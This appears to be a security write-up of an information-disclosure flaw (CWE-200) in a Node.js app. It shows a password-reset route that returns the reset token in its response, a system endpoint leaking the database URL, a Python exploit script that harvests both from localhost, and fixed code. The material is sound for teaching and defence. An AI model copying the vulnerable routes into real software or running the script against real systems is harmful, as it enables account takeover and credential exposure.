# Vulnerability: Information Disclosure

## 1. Vulnerability Name
**CWE-200: Exposure of Sensitive Information to an Unauthorized Actor**

## 2. Location in Code
- **File:** `backend/src/routes/auth.js` (lines 65-75)
- **File:** `backend/src/routes/system.js` (lines 10-20)
- **File:** `backend/app.js` (lines 45-55)

```javascript
// auth.js - Password reset token exposure
router.post('/reset-password', async (req, res) => {
    try {
        const { email } = req.body;
        const user = await User.findOne({ email });
        
        if (!user) {
            return res.status(404).json({ message: 'User not found' });
        }
        
        const resetToken = Math.random().toString(36).substring(7);
        user.resetToken = resetToken;
        await user.save();
        
        // Exposes reset token in response
        res.json({ 
            message: 'Reset token generated', 
            resetToken: resetToken,
            userId: user._id 
        });
    } catch (error) {
        res.status(500).json({ message: 'Server error', error: error.message });
    }
});

// system.js - System information exposure
router.get('/info', (req, res) => {
    res.json({
        nodeVersion: process.version,
        platform: process.platform,
        uptime: process.uptime(),
        memoryUsage: process.memoryUsage(),
        environment: process.env.NODE_ENV,
        databaseUrl: process.env.DATABASE_URL
    });
});
```

## 3. Technical Root Cause
The application exposes sensitive system information, internal error details, and security tokens through various endpoints. Error messages contain stack traces and internal paths, while system endpoints reveal infrastructure details that aid attackers in reconnaissance.

## 4. Proof of Concept Explanation
1. Access the system information endpoint to gather server details
2. Trigger errors to expose internal application structure
3. Use password reset functionality to obtain reset tokens
4. Leverage exposed information for further attacks

## 5. Exploit Script

```python
#!/usr/bin/env python3
import requests
import json

def exploit_information_disclosure():
    base_url = "http://localhost:5000"
    
    print("[+] Testing information disclosure vulnerabilities...")
    
    # 1. System information exposure
    print("\n[1] Attempting to access system information...")
    system_response = requests.get(f"{base_url}/api/system/info")
    
    if system_response.status_code == 200:
        system_info = system_response.json()
        print("[!] SYSTEM INFORMATION DISCLOSED:")
        print(f"    Node Version: {system_info.get('nodeVersion')}")
        print(f"    Platform: {system_info.get('platform')}")
        print(f"    Database URL: {system_info.get('databaseUrl')}")
        print(f"    Environment: {system_info.get('environment')}")
    
    # 2. Password reset token exposure
    print("\n[2] Testing password reset token exposure...")
    reset_data = {"email": "demo@tenantguard.com"}
    reset_response = requests.post(f"{base_url}/api/auth/reset-password", json=reset_data)
    
    if reset_response.status_code == 200:
        reset_info = reset_response.json()
        print("[!] PASSWORD RESET TOKEN EXPOSED:")
        print(f"    Reset Token: {reset_info.get('resetToken')}")
        print(f"    User ID: {reset_info.get('userId')}")
    
    # 3. Error message information disclosure
    print("\n[3] Testing error message disclosure...")
    invalid_response = requests.get(f"{base_url}/api/documents/invalid-id-format")
    
    if invalid_response.status_code == 500:
        error_info = invalid_response.json()
        if 'error' in error_info:
            print("[!] DETAILED ERROR INFORMATION DISCLOSED:")
            print(f"    Error Details: {error_info.get('error')}")
    
    # 4. Health endpoint information
    print("\n[4] Checking health endpoint for sensitive data...")
    health_response = requests.get(f"{base_url}/health")
    
    if health_response.status_code == 200:
        health_info = health_response.json()
        print("[!] HEALTH ENDPOINT INFORMATION:")
        print(f"    Status: {health_info.get('status')}")
        print(f"    Database: {health_info.get('database')}")
        print(f"    Timestamp: {health_info.get('timestamp')}")
    
    print("\n[+] Information disclosure testing completed")
    return True

if __name__ == "__main__":
    exploit_information_disclosure()
```

## 6. Impact
- **Reconnaissance:** Detailed system information aids attack planning
- **Credential Exposure:** Reset tokens enable account takeover
- **Path Disclosure:** Internal file paths revealed through errors
- **Infrastructure Mapping:** Database connections and environment details exposed

**CVSS Score:** 6.5 (Medium)

## 7. Fix Recommendation

Implement proper information security controls:

```javascript
// Secure error handling
const handleError = (error, req, res, next) => {
    // Log detailed error internally
    console.error('Error:', error);
    
    // Return generic error to client
    const isDevelopment = process.env.NODE_ENV === 'development';
    
    res.status(error.status || 500).json({
        message: isDevelopment ? error.message : 'Internal server error',
        // Never expose stack traces or internal details in production
        ...(isDevelopment && { stack: error.stack })
    });
};

// Secure password reset
router.post('/reset-password', async (req, res) => {
    try {
        const { email } = req.body;
        const user = await User.findOne({ email });
        
        // Always return same response regardless of user existence
        res.json({ 
            message: 'If the email exists, a reset link has been sent' 
        });
        
        if (user) {
            const resetToken = crypto.randomBytes(32).toString('hex');
            const resetExpiry = new Date(Date.now() + 3600000); // 1 hour
            
            user.resetToken = await bcrypt.hash(resetToken, 12);
            user.resetTokenExpiry = resetExpiry;
            await user.save();
            
            // Send token via secure email, never in response
            await sendResetEmail(user.email, resetToken);
        }
    } catch (error) {
        res.status(500).json({ message: 'Server error' });
    }
});

// Remove or secure system information endpoint
router.get('/info', authenticateToken, authorizeAdmin, (req, res) => {
    // Only provide minimal, non-sensitive information
    res.json({
        status: 'operational',
        version: '1.0.0',
        timestamp: new Date().toISOString()
    });
});

// Secure health endpoint
router.get('/health', (req, res) => {
    res.json({
        status: 'healthy',
        timestamp: new Date().toISOString()
        // Remove database connection details
    });
});
```